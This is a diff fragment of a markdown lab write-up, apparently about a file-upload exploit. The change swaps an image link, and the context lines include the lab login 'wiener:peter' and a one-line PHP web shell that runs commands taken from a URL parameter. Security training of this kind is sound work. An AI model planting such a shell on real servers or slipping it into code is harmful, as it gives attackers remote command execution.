@@ -31,8 +31,7 @@ You can log in to your own account using the following credentials: `wiener:pete
    ```php
    <?php system($_GET['cmd']); ?>
    ```
-   ![image](https://github.com/user-attachments/assets/50a7c27e-46f7-4855-bb7e-2af3ca37e86a)
-
+   ![image](https://github.com/user-attachments/assets/e8fa4c9e-2335-4f61-a057-79259093c45b)
 
 
    ## **Accessing the Malicious File**
